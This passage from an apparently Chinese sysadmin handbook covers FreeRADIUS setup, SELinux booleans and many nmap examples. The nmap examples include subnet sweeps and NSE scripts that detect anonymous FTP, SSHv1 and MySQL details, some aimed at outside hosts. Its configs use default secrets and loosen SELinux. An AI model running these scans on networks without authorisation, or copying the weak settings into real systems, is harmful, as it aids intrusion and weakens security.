OK, we have installed let's quickly test it. the '******' is your password.

```
netkiller@shenzhen:~$ radtest netkiller ****** localhost 0 testing123
Sending Access-Request of id 237 to 127.0.0.1 port 1812
        User-Name = "netkiller"
        User-Password = "******"
        NAS-IP-Address = 255.255.255.255
        NAS-Port = 0
rad_recv: Access-Accept packet from host 127.0.0.1:1812, id=237, length=20

```

if you can see 'Access-Accept', you have succeed

let me to input an incorrect password.

```
netkiller@shenzhen:~$ radtest netkiller ****** localhost 0 testing123
Sending Access-Request of id 241 to 127.0.0.1 port 1812
        User-Name = "netkiller"
        User-Password = "******"
        NAS-IP-Address = 255.255.255.255
        NAS-Port = 0
Re-sending Access-Request of id 241 to 127.0.0.1 port 1812
        User-Name = "netkiller"
        User-Password = "******"
        NAS-IP-Address = 255.255.255.255
        NAS-Port = 0
rad_recv: Access-Reject packet from host 127.0.0.1:1812, id=241, length=20

```

you will see 'Access-Reject'.

默认你只能通过 localhost 访问 radius, 如需其他网络访问需要在配置文件中添加类似下面配置，配置文件在 /etc/freeradius/clients.conf

```
# vim /etc/freeradius/clients.conf

client 172.16.0.0/24 {
       secret          = testing123
       shortname       = freeradius.example.com
}

```

##### 3.4.1.2. 安装 radiusd

CentOS 与 Ubuntu 安装包有所不同，配置文件在 /etc/raddb 下面

过程 141.6. 安装步骤

1.  yum 安装

    ```
    yum install -y freeradius

    ```

    ```
    # yum install freeradius freeradius-utils			

    ```

2.  设置启动文件

    ```
    chkconfig radiusd on
    service radiusd start

    ```

3.  配置 radiusd

    ```
    cp /etc/raddb/clients.conf{,.original}
    cp /etc/raddb/users{,.original}
    cp /etc/raddb/sites-enabled/default{,.original}

    ```

    ```

    cat >> /etc/raddb/clients.conf <<EOF

    client 192.168.0.0/16 {
           secret          = testing123
           shortname       = freeradius.example.com
    }
    EOF				

    ```

    /etc/raddb/users

    ```
    guest Cleartext-Password := "test"

    ```

    /etc/raddb/sites-enabled/default

4.  测试 radiusd

    ```
    $ radtest guest test 192.168.2.1 1812 testing123
    Sending Access-Request of id 223 to 192.168.2.1 port 1812
    	User-Name = "guest"
    	User-Password = "test"
    	NAS-IP-Address = 127.0.1.1
    	NAS-Port = 1812
    	Message-Authenticator = 0x00000000000000000000000000000000
    rad_recv: Access-Accept packet from host 192.168.2.1 port 1812, id=223, length=20

    ```

#### 3.4.2. ldap

#### 3.4.3. mysql

#### 3.4.4. WAP2 Enterprise

WRT54G

### 3.5. SASL (Simple Authentication and Security Layer)

### 3.6. GSSAPI (Generic Security Services Application Program Interface)

## 第 142 章 SELinux

## 1. getsebool - get SELinux boolean value

```
# getsebool -a
abrt_anon_write --> off
abrt_handle_event --> off
allow_console_login --> on
allow_cvs_read_shadow --> off
allow_daemons_dump_core --> on
allow_daemons_use_tcp_wrapper --> off
allow_daemons_use_tty --> on
allow_domain_fd_use --> on
allow_execheap --> off
allow_execmem --> on
allow_execmod --> on
allow_execstack --> on
allow_ftpd_anon_write --> off
allow_ftpd_full_access --> off
allow_ftpd_use_cifs --> off
allow_ftpd_use_nfs --> off
allow_gssd_read_tmp --> on
allow_guest_exec_content --> off
allow_httpd_anon_write --> off
allow_httpd_mod_auth_ntlm_winbind --> off
allow_httpd_mod_auth_pam --> off
allow_httpd_sys_script_anon_write --> off
allow_java_execstack --> off
allow_kerberos --> on
allow_mount_anyfile --> on
allow_mplayer_execstack --> off
allow_nsplugin_execmem --> on
allow_polyinstantiation --> off
allow_postfix_local_write_mail_spool --> on
allow_ptrace --> off
allow_rsync_anon_write --> off
allow_saslauthd_read_shadow --> off
allow_smbd_anon_write --> off
allow_ssh_keysign --> off
allow_staff_exec_content --> on
allow_sysadm_exec_content --> on
allow_unconfined_nsplugin_transition --> off
allow_user_exec_content --> on
allow_user_mysql_connect --> off
allow_user_postgresql_connect --> off
allow_write_xshm --> off
allow_xguest_exec_content --> off
allow_xserver_execmem --> off
allow_ypbind --> off
allow_zebra_write_config --> on
authlogin_radius --> off
cdrecord_read_content --> off
clamd_use_jit --> off
cobbler_anon_write --> off
cobbler_can_network_connect --> off
cobbler_use_cifs --> off
cobbler_use_nfs --> off
condor_domain_can_network_connect --> off
cron_can_relabel --> off
dhcpc_exec_iptables --> off
domain_kernel_load_modules --> off
exim_can_connect_db --> off
exim_manage_user_files --> off
exim_read_user_files --> off
fcron_crond --> off
fenced_can_network_connect --> off
fenced_can_ssh --> off
ftp_home_dir --> off
ftpd_connect_db --> off
ftpd_use_passive_mode --> off
git_cgit_read_gitosis_content --> off
git_session_bind_all_unreserved_ports --> off
git_system_enable_homedirs --> off
git_system_use_cifs --> off
git_system_use_nfs --> off
global_ssp --> off
gpg_agent_env_file --> off
gpg_web_anon_write --> off
httpd_builtin_scripting --> on
httpd_can_check_spam --> off
httpd_can_network_connect --> off
httpd_can_network_connect_cobbler --> off
httpd_can_network_connect_db --> off
httpd_can_network_memcache --> off
httpd_can_network_relay --> off
httpd_can_sendmail --> off
httpd_dbus_avahi --> on
httpd_enable_cgi --> on
httpd_enable_ftp_server --> off
httpd_enable_homedirs --> off
httpd_execmem --> off
httpd_manage_ipa --> off
httpd_read_user_content --> off
httpd_setrlimit --> off
httpd_ssi_exec --> off
httpd_tmp_exec --> off
httpd_tty_comm --> on
httpd_unified --> on
httpd_use_cifs --> off
httpd_use_gpg --> off
httpd_use_nfs --> off
httpd_use_openstack --> off
icecast_connect_any --> off
init_upstart --> on
irssi_use_full_network --> off
logging_syslogd_can_sendmail --> off
mmap_low_allowed --> off
mozilla_read_content --> off
mysql_connect_any --> off
named_write_master_zones --> off
ncftool_read_user_content --> off
nscd_use_shm --> on
nsplugin_can_network --> on
openvpn_enable_homedirs --> on
piranha_lvs_can_network_connect --> off
pppd_can_insmod --> off
pppd_for_user --> off
privoxy_connect_any --> on
puppet_manage_all_files --> off
puppetmaster_use_db --> off
qemu_full_network --> on
qemu_use_cifs --> on
qemu_use_comm --> off
qemu_use_nfs --> on
qemu_use_usb --> on
racoon_read_shadow --> off
rgmanager_can_network_connect --> off
rsync_client --> off
rsync_export_all_ro --> off
rsync_use_cifs --> off
rsync_use_nfs --> off
samba_create_home_dirs --> off
samba_domain_controller --> off
samba_enable_home_dirs --> off
samba_export_all_ro --> off
samba_export_all_rw --> off
samba_run_unconfined --> off
samba_share_fusefs --> off
samba_share_nfs --> off
sanlock_use_nfs --> off
sanlock_use_samba --> off
secure_mode --> off
secure_mode_insmod --> off
secure_mode_policyload --> off
sepgsql_enable_users_ddl --> on
sepgsql_unconfined_dbadm --> on
sge_domain_can_network_connect --> off
sge_use_nfs --> off
smartmon_3ware --> off
spamassassin_can_network --> off
spamd_enable_home_dirs --> on
squid_connect_any --> on
squid_use_tproxy --> off
ssh_chroot_rw_homedirs --> off
ssh_sysadm_login --> off
telepathy_tcp_connect_generic_network_ports --> off
tftp_anon_write --> off
tor_bind_all_unreserved_ports --> off
unconfined_login --> on
unconfined_mmap_zero_ignore --> off
unconfined_mozilla_plugin_transition --> off
use_fusefs_home_dirs --> off
use_lpd_server --> off
use_nfs_home_dirs --> on
use_samba_home_dirs --> off
user_direct_dri --> on
user_direct_mouse --> off
user_ping --> on
user_rw_noexattrfile --> on
user_setrlimit --> on
user_tcp_server --> off
user_ttyfile_stat --> off
varnishd_connect_any --> off
vbetool_mmap_zero_ignore --> off
virt_use_comm --> off
virt_use_fusefs --> off
virt_use_nfs --> off
virt_use_samba --> off
virt_use_sanlock --> off
virt_use_sysfs --> on
virt_use_usb --> on
virt_use_xserver --> off
webadm_manage_user_files --> off
webadm_read_user_files --> off
wine_mmap_zero_ignore --> off
xdm_exec_bootloader --> off
xdm_sysadm_login --> off
xen_use_nfs --> off
xguest_connect_network --> on
xguest_mount_media --> on
xguest_use_bluetooth --> on
xserver_object_manager --> off

```

### 1.1. HTTP 相关配置

```

[root@netkiller ~]# getsebool -a | grep httpd
httpd_anon_write --> off
httpd_builtin_scripting --> on
httpd_can_check_spam --> off
httpd_can_connect_ftp --> off
httpd_can_connect_ldap --> off
httpd_can_connect_mythtv --> off
httpd_can_connect_zabbix --> off
httpd_can_network_connect --> off
httpd_can_network_connect_cobbler --> off
httpd_can_network_connect_db --> off
httpd_can_network_memcache --> off
httpd_can_network_relay --> off
httpd_can_sendmail --> off
httpd_dbus_avahi --> off
httpd_dbus_sssd --> off
httpd_dontaudit_search_dirs --> off
httpd_enable_cgi --> on
httpd_enable_ftp_server --> off
httpd_enable_homedirs --> off
httpd_execmem --> off
httpd_graceful_shutdown --> on
httpd_manage_ipa --> off
httpd_mod_auth_ntlm_winbind --> off
httpd_mod_auth_pam --> off
httpd_read_user_content --> off
httpd_run_ipa --> off
httpd_run_preupgrade --> off
httpd_run_stickshift --> off
httpd_serve_cobbler_files --> off
httpd_setrlimit --> off
httpd_ssi_exec --> off
httpd_sys_script_anon_write --> off
httpd_tmp_exec --> off
httpd_tty_comm --> off
httpd_unified --> off
httpd_use_cifs --> off
httpd_use_fusefs --> off
httpd_use_gpg --> off
httpd_use_nfs --> off
httpd_use_openstack --> off
httpd_use_sasl --> off
httpd_verify_dns --> off

```

## 2. sestatus - SELinux status tool

```
# sestatus -v
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             targeted
Current mode:                   permissive
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Max kernel policy version:      28

Process contexts:
Current context:                unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Init context:                   system_u:system_r:init_t:s0
/usr/sbin/sshd                  unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

File contexts:
Controlling terminal:           unconfined_u:object_r:user_devpts_t:s0
/etc/passwd                     system_u:object_r:passwd_file_t:s0
/etc/shadow                     system_u:object_r:shadow_t:s0
/bin/bash                       system_u:object_r:shell_exec_t:s0
/bin/login                      system_u:object_r:login_exec_t:s0
/bin/sh                         system_u:object_r:bin_t:s0 -> system_u:object_r:shell_exec_t:s0
/sbin/agetty                    system_u:object_r:getty_exec_t:s0
/sbin/init                      system_u:object_r:bin_t:s0 -> system_u:object_r:init_exec_t:s0
/usr/sbin/sshd                  system_u:object_r:sshd_exec_t:s0

```

## 3. setsebool - set SELinux boolean value

```
setsebool -P httpd_can_network_connect on

```

## 4. chcon - change file SELinux security context

## 5. rsync

```
允许客户端从服务端下载数据，
setsebool -P allow_rsync_anon_write on

 取消 SElinux 对 rsync 的保护.
setsebool -P rsync_disable_trans off

```

## 6. 查找被 SELINUX 禁用服务

### 6.1. Nginx

```

[root@netkiller ~]# cat /var/log/audit/audit.log | grep nginx | grep denied | more		

```

## 第 143 章 Sniffer

## 1. nmap - Network exploration tool and security / port scanner

**nmap**

```

Nmap 支持的四种最基本的扫描方式:

    * TCP connect()端口扫描（-sT 参数）

    * TCP 同步（SYN）端口扫描（-sS 参数）

    * UDP 端口扫描（-sU 参数）

    * Ping 扫描（-sP 参数）

如果要勾画一个网络的整体情况,Ping 扫描和 TCP SYN 扫描最为实用

 Ping 扫描通过发送 ICMP（Internet Control Message Protocol，Internet 控制消息协议）回应请求数据包和 TCP 应答（Acknowledge，简写 ACK）数据包，确定主机的状态，非常适合于检测指定网段内正在运行的主机数量.

 TCP SYN 扫描与 TCP connect()扫描比较
    TCP connect()扫描中,扫描器利用操作系统本身的系统调用打开一个完整的 TCP 连接也就是说,扫描器打开了两个主机之间的完整握手过程（SYN, SYN-ACK 和 ACK）.一次完整执行的握手过程表明远程主机端口是打开的.

    TCP SYN 扫描创建的是半打开的连接,它与 TCP connect()扫描的不同之处在于,TCP SYN 扫描发送的是复位（RST）标记而不是结束 ACK 标记（即 SYN,SYN-ACK,或 RST）：如果远程主机正在监听且端口是打开的,远程主机用 SYN-ACK 应答,Nmap 发送一个 RST:如果远程主机的端口是关闭的,它的应答将是 RST,此时 Nmap 转入下一个端口

-sS 使用 SYN＋ACK 的方法,使用 TCP SYN，

-sT 使用 TCP 的方法,3 次握手全做

-sU 使用 UDP 的方法

-sP ICMP ECHO Request 送信，有反应的端口进行检查

-sN 全部 FLAG OFF 的无效的 TCP 包送信，根据错误代码判断端口情况

-P0 无视 ICMP ECHO request 的结果，SCAN

-p scan port range 指定 SCAN 的目标端口的范围

   1-100, 或者使用 25,100 的方式

-O 侦测 OS 的类型

-A 全面进攻性扫描(包括各种主机发现、端口扫描、版本扫描、OS 扫描及默认脚本扫描)

-oN 文件名 通常格式文件输出

-oX 文件名 通过 DTD,使用 XML 格式输出结果

-oG 文件名, grep 容易的格式输出

-sV 服务的程序名和版本 SCAN	

```

```
$ nmap localhost

Starting Nmap 4.20 ( http://insecure.org ) at 2007-11-19 05:20 EST
Interesting ports on localhost (127.0.0.1):
Not shown: 1689 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql

```

### 1.1. 端口扫描

```
# nmap -Pn 192.168.4.13

Starting Nmap 6.40 ( http://nmap.org ) at 2016-11-04 15:41 CST
Nmap scan report for gts2apidemo.cfddealer88.com (192.168.4.13)
Host is up (0.0051s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8008/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds

```

扫描网段内开机的主机

```
nmap -sP 140.15.35.0/24		

```

### 1.2. HOST DISCOVERY

#### 1.2.1. -sP: Ping Scan - go no further than determining if host is online

扫描一个网段

```
$ nmap  -v -sP 172.16.0.0/24

Starting Nmap 4.62 ( http://nmap.org ) at 2010-11-27 10:00 CST
Initiating Ping Scan at 10:00
Scanning 256 hosts [1 port/host]
Completed Ping Scan at 10:00, 0.80s elapsed (256 total hosts)
Initiating Parallel DNS resolution of 256 hosts. at 10:00
Completed Parallel DNS resolution of 256 hosts. at 10:00, 2.77s elapsed
Host 172.16.0.0 appears to be down.
Host 172.16.0.1 appears to be up.
Host 172.16.0.2 appears to be up.
Host 172.16.0.3 appears to be down.
Host 172.16.0.4 appears to be down.
Host 172.16.0.5 appears to be up.
Host 172.16.0.6 appears to be down.
Host 172.16.0.7 appears to be down.
Host 172.16.0.8 appears to be down.
Host 172.16.0.9 appears to be up.
...
...
Host 172.16.0.253 appears to be down.
Host 172.16.0.254 appears to be down.
Host 172.16.0.255 appears to be down.
Read data files from: /usr/share/nmap
Nmap done: 256 IP addresses (8 hosts up) scanned in 3.596 seconds

```

扫描正在使用的 IP 地址

```
$ nmap  -v -sP 172.16.0.0/24 | grep up
Host 172.16.0.1 appears to be up.
Host 172.16.0.2 appears to be up.
Host 172.16.0.5 appears to be up.
Host 172.16.0.9 appears to be up.
Host 172.16.0.19 appears to be up.
Host 172.16.0.40 appears to be up.
Host 172.16.0.188 appears to be up.
Host 172.16.0.252 appears to be up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 6.574 seconds

$ nmap -sn -oG - 172.16.1.0/24 | grep Up
Host: 172.16.1.1 ()	Status: Up
Host: 172.16.1.2 ()	Status: Up
Host: 172.16.1.3 ()	Status: Up
Host: 172.16.1.4 ()	Status: Up
Host: 172.16.1.5 ()	Status: Up
Host: 172.16.1.6 ()	Status: Up

```

扫描 MAC 地址

```
nmap -sP -PI -PT -oN ipandmaclist.txt 192.168.80.0/24

```

### 1.3. SCAN TECHNIQUES

#### 1.3.1. -sU: UDP Scan 扫描

扫描 DNS 端口

**$ sudo nmap -sU -p 53 xxx.xxx.xxx.xxx**

```
neo@deployment:~$ sudo nmap -sU -p 53 localhost

Starting Nmap 5.00 ( http://nmap.org ) at 2012-02-02 15:24 CST
Warning: Hostname localhost resolves to 2 IPs. Using 127.0.0.1.
Interesting ports on localhost (127.0.0.1):
PORT   STATE         SERVICE
53/udp open|filtered domain

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds

neo@deployment:~$ sudo nmap -sU -p 1194 localhost

Starting Nmap 5.00 ( http://nmap.org ) at 2012-02-02 15:24 CST
Warning: Hostname localhost resolves to 2 IPs. Using 127.0.0.1.
Interesting ports on localhost (127.0.0.1):
PORT     STATE  SERVICE
1194/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds

neo@deployment:~$ sudo nmap -sU -v localhost

Starting Nmap 5.00 ( http://nmap.org ) at 2012-02-02 15:22 CST
NSE: Loaded 0 scripts for scanning.
Warning: Hostname localhost resolves to 2 IPs. Using 127.0.0.1.
Initiating UDP Scan at 15:22
Scanning localhost (127.0.0.1) [1000 ports]
Completed UDP Scan at 15:22, 1.26s elapsed (1000 total ports)
Host localhost (127.0.0.1) is up (0.000010s latency).
Interesting ports on localhost (127.0.0.1):
Not shown: 993 closed ports
PORT     STATE         SERVICE
53/udp   open|filtered domain
111/udp  open|filtered rpcbind
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
1812/udp open|filtered radius
1813/udp open|filtered radacct

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
           Raw packets sent: 1007 (28.196KB) | Rcvd: 993 (55.608KB)

```

以 UDP 数据包格式进行扫描, 如果你想知道在某台主机上提供哪些 UDP(用户数据报协议,RFC768)服务,可以使用这种扫描方法.nmap 首先向目标主机的每个端口发出一个 0 字节的 UDP 包,如果我们收到端口不可达的 ICMP 消息,端口就是关闭的,否则我们就假设它是打开的.

```

[root@netkiller ~]# nmap -sU x.x.x.x

Nmap scan report for x.x.x.x
Host is up (0.023s latency).
Not shown: 984 closed ports
PORT     STATE         SERVICE
67/udp   open|filtered dhcps
68/udp   open|filtered dhcpc
80/udp   open|filtered http
111/udp  open          rpcbind
135/udp  open|filtered msrpc
136/udp  open|filtered profile
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
139/udp  open|filtered netbios-ssn
445/udp  open|filtered microsoft-ds
520/udp  open|filtered route
626/udp  open|filtered serialnumberd
631/udp  open|filtered ipp
1433/udp open|filtered ms-sql-s
1434/udp open|filtered ms-sql-m
5353/udp open          zeroconf

Nmap done: 1 IP address (1 host up) scanned in 1026.28 seconds

```

#### 1.3.2. -b <FTP relay host>: FTP bounce scan

### 1.4. PORT SPECIFICATION AND SCAN ORDER

#### 1.4.1. -p <port ranges>: Only scan specified ports

Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080

```
sudo nmap -sU -p 53 localhost

```

扫描 DHCP 服务器

```
sudo nmap -sU -p U:67,68 192.168.0.0/24

sudo nmap -sU -p U:67,68 192.168.0.0/24 > /tmp/dhcp.log

```

```
$ sudo nmap -sU -p161 192.168.0.0/24 > /tmp/snmp.log

```

扫描多台主机

```

1) 扫描子网
nmap 192.168.0.*
nmap 192.168.0.0/24

2) 指定几台主机
nmap 192.168.0.123,124,125

3) 指定一段主机
nmap 192.168.0.123-140			

```

### 1.5. SCRIPT SCAN

nmap script 使用 lua 编写，请先安装 lua 环境。

```

$ sudo apt-get install lua5.1

$ lua
Lua 5.1.4  Copyright (C) 1994-2008 Lua.org, PUC-Rio
> ^C

```

```

$ nmap --script "default and safe" localhost

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 16:23 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00023s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 1024 a6:ab:76:a5:fb:80:4e:2c:bc:06:d4:85:ff:22:18:1a (DSA)
|_2048 c7:da:16:7a:e7:01:cc:f0:d2:02:b4:17:52:c9:c2:50 (RSA)
80/tcp   open  http
|_html-title: 500 Internal Server Error
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
631/tcp  open  ipp
3000/tcp open  ppp
9000/tcp open  cslistener

Host script results:
|_nbstat: NetBIOS name: NEO-OPTIPLEX-38, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
|_smbv2-enabled: Server doesn't support SMBv2 protocol
| smb-os-discovery:
|   OS: Unix (Samba 3.5.11)
|   Name: WORKGROUP\Unknown
|_  System time: 2012-02-02 16:23:08 UTC+8

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds

$ nmap --script=default 172.16.1.5

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 16:25 CST
Nmap scan report for 172.16.1.5
Host is up (0.024s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 1024 c1:40:33:3b:be:4d:ef:52:40:a9:08:0a:e1:ae:d7:91 (DSA)
|_2048 9d:db:c5:41:94:63:c7:51:d1:97:36:d3:87:ad:8f:a5 (RSA)
3306/tcp open  mysql
| mysql-info: Protocol: 10
| Version: 5.1.48-community-log
| Thread ID: 6647320
| Some Capabilities: Long Passwords, Connect with DB, Compress, ODBC, Transactions, Secure Connection
| Status: Autocommit
|_Salt: 0%eRHQ?'Fi_!%6|4+w9U
5666/tcp open  nrpe

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds

```

#### 1.5.1. ftp-anon

```
$ nmap -p21 --script=ftp-anon 172.16.3.100

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 16:51 CST
NSE: Script Scanning completed.
Nmap scan report for 172.16.3.100
Host is up (0.0066s latency).
PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds

```

#### 1.5.2. mysql-info

```
$ nmap -p3306 --script=mysql-info 172.16.0.5

Starting Nmap 5.00 ( http://nmap.org ) at 2012-02-02 16:58 CST
Interesting ports on 172.16.0.5:
PORT     STATE SERVICE
3306/tcp open  mysql
|  mysql-info: Protocol: 10
|  Version: 5.1.48-community-log
|  Thread ID: 62837508
|  Some Capabilities: Long Passwords, Connect with DB, Compress, ODBC, Transactions, Secure Connection
|  Status: Autocommit
|_ Salt: T{3(moe.R2C;?fgP:rQ|

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds

```

#### 1.5.3. http

http-date

```
$ nmap -p80 --script=http-date www.baidu.com

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 18:37 CST
NSE: Script Scanning completed.
Nmap scan report for www.baidu.com (220.181.111.147)
Host is up (0.037s latency).
PORT   STATE SERVICE
80/tcp open  http
|_http-date: Thu, 02 Feb 2012 10:37:40 GMT; 0s from local time.

Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds

```

http-headers

```
$ nmap -p80 --script=http-headers www.baidu.com

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 18:38 CST
NSE: Script Scanning completed.
Nmap scan report for www.baidu.com (220.181.111.147)
Host is up (0.036s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-headers:
|   Date: Thu, 02 Feb 2012 10:38:15 GMT
|   Server: BWS/1.0
|   Content-Length: 7677
|   Content-Type: text/html;charset=gb2312
|   Cache-Control: private
|   Expires: Thu, 02 Feb 2012 10:38:15 GMT
|   Set-Cookie: BAIDUID=0279AEA82B65E8B74C03D5B6AA92326C:FG=1; expires=Thu, 02-Feb-42 10:38:15 GMT; path=/; domain=.baidu.com
|   P3P: CP=" OTI DSP COR IVA OUR IND COM "
|   Connection: Close
|
|_  (Request type: HEAD)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds

```

```
$ nmap -p80 --script=http-date,http-headers,http-malware-host,http-trace,http-enum 192.168.3.5

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 19:15 CST
NSE: Script Scanning completed.
Nmap scan report for 192.168.3.5
Host is up (0.0015s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-headers:
|   Date: Thu, 02 Feb 2012 11:15:00 GMT
|   Server: Apache
|   Last-Modified: Mon, 29 Nov 2010 14:56:50 GMT
|   ETag: "7bcaa3-2c-496324828b080"
|   Accept-Ranges: bytes
|   Content-Length: 44
|   Connection: close
|   Content-Type: text/html
|
|_  (Request type: HEAD)
|_http-malware-host: Host appears to be clean
|_http-date: Thu, 02 Feb 2012 11:15:00 GMT; 0s from local time.
|_http-enum:

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds

```

#### 1.5.4. snmp

```
$ sudo nmap -sU -p161 --script=snmp-sysdescr 172.16.3.250

Starting Nmap 5.00 ( http://nmap.org ) at 2012-02-02 19:20 CST
Interesting ports on 172.16.3.250:
PORT    STATE SERVICE
161/udp open  snmp
|  snmp-sysdescr: Cisco Adaptive Security Appliance Version 8.2(5)
|_   System uptime: 84 days, 18:39:55.00 (732479500 timeticks)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

```

#### 1.5.5. SSHv1

```
$ sudo nmap -sT -p22 --script=sshv1 172.16.0.0/24

$ sudo nmap -sT -p22 --script=sshv1 172.16.3.0/24 --open | grep -B4 sshv1

Interesting ports on 172.16.3.250:
PORT   STATE SERVICE
22/tcp open  ssh
|_ sshv1: Server supports SSHv1

Interesting ports on 172.16.3.251:
PORT   STATE SERVICE
22/tcp open  ssh
|_ sshv1: Server supports SSHv1

```

```
$ nmap -sT -p22 172.16.0.0/24 --script=ssh-hostkey --script-args=ssh_hostkey=all > ssh.log

$ nmap -sT -p22 172.16.0.5 --script=ssh-hostkey --script-args=ssh_hostkey=full

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 19:35 CST
NSE: Script Scanning completed.
Nmap scan report for 172.16.0.5
Host is up (0.0017s latency).
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: ssh-dss AAAAB3NzaC1kc3MAAACBANinhMHgAGFMhkYW0qmFTNsJKuim8P7vFfPV3+c9R0urqF42HwZrIbhEZhRlUDSGo0v5cFzufabQaQ58//L4UXYqKOHaiqSo4ju5CWquH6YY+SNhszJY4OSessioJJfjbLCXx73pfqX8akEV13jQujLhYD0Tuela0/c4iQW+ktnjAAAAFQDxCjX3PK+dAUKviG6xX2C6DstqUQAAAIBrEephaZhQJg3ctO3Y7OMAOu/uRKt9VpeChbptsh4DGXk6Lmet5hYJ1/UOzEAZd4dEO0uijy8iKYSZoAaZh2qGa9PynIWuD1ENt8feEMwRv5VV7zaNitmjYedmPO9rLAja1/49mxUq9XAeRYTOhWJlbwrc38sybTsCrDsdoxDqUwAAAIEAzV7w+dy0lzER0OHfy/E70So80V8/2Bo3AIwnACWGMTqKC2CrFm6VWDKA9P4x0bq+JBshpjtur/3H0sgAt+Zky3Z2EWpdf+9z1AqTy3l95J+xQhQTzD2lw+NqroInxEqJU0eip3YgdTqksQuDRCSy/hKJDLJOELkWbDLMlb1vXA8=
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAlgJcaT8/F0Ah+Jq9PifhQ3Bvfh4Nl5/WWiyoF0yIhhKlNnO04Vnbi8Qb39BDVRKaqIrfhgbG3vxfyF3TeSEOoAiXXyCns6Ivl7HUEHVsjHOVu7nwwMqo94CaM1+pUgJtXmbmTWyfWGCm8kGD2xNaxs10uxIcuukBN7jlN2TGyEmOD8QkA+1Dx7XGBjpMZT+DQwmEo72V2taAo3a0UOz9ivAakZ/kysP+PN+Kz106iT3BWMkvQScyt96HAwbq8Z0tO531mz90UGVBS1KqNMtNsLHsXYJnQ3obXUTwo8KvtEvJ1UHDs6QdEP55PiBTVvCS+CbEwZZ9O1yGNfznBWmp4Q==

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds

$ nmap -sT -p22 172.16.0.5 --script=ssh-hostkey --script-args=ssh_hostkey=all

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 19:35 CST
NSE: Script Scanning completed.
Nmap scan report for 172.16.0.5
Host is up (0.0014s latency).
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 1024 26:89:a4:1d:f1:28:3c:36:88:ea:49:6d:1b:df:de:70 (DSA)
| 1024 xumep-dynut-poheh-cenys-dyfyz-tubap-lupoz-fofyd-figuf-timaz-byxox (DSA)
| +--[ DSA 1024]----+
| |    .            |
| |.o   +           |
| |o * + .          |
| |...B o .         |
| |...+o o S        |
| |o o + .o         |
| | o . . o E       |
| |      . +        |
| |       . .       |
| +-----------------+
| ssh-dss AAAAB3NzaC1kc3MAAACBANinhMHgAGFMhkYW0qmFTNsJKuim8P7vFfPV3+c9R0urqF42HwZrIbhEZhRlUDSGo0v5cFzufabQaQ58//L4UXYqKOHaiqSo4ju5CWquH6YY+SNhszJY4OSessioJJfjbLCXx73pfqX8akEV13jQujLhYD0Tuela0/c4iQW+ktnjAAAAFQDxCjX3PK+dAUKviG6xX2C6DstqUQAAAIBrEephaZhQJg3ctO3Y7OMAOu/uRKt9VpeChbptsh4DGXk6Lmet5hYJ1/UOzEAZd4dEO0uijy8iKYSZoAaZh2qGa9PynIWuD1ENt8feEMwRv5VV7zaNitmjYedmPO9rLAja1/49mxUq9XAeRYTOhWJlbwrc38sybTsCrDsdoxDqUwAAAIEAzV7w+dy0lzER0OHfy/E70So80V8/2Bo3AIwnACWGMTqKC2CrFm6VWDKA9P4x0bq+JBshpjtur/3H0sgAt+Zky3Z2EWpdf+9z1AqTy3l95J+xQhQTzD2lw+NqroInxEqJU0eip3YgdTqksQuDRCSy/hKJDLJOELkWbDLMlb1vXA8=
| 2048 98:fb:db:e0:a3:99:18:04:cb:8c:42:25:f0:f5:b3:5a (RSA)
| 2048 xogok-vykec-zacyg-ruzup-baral-kotyv-latoz-hygyz-hysis-zadun-hyxix (RSA)
| +--[ RSA 2048]----+
| |o. ..            |
| | .o. .           |
| | .o   o          |
| |.+ o   =         |
| |o + . E S        |
| |.  . o .         |
| |    o . .        |
| |     o =.o       |
| |    . +.+o.      |
| +-----------------+
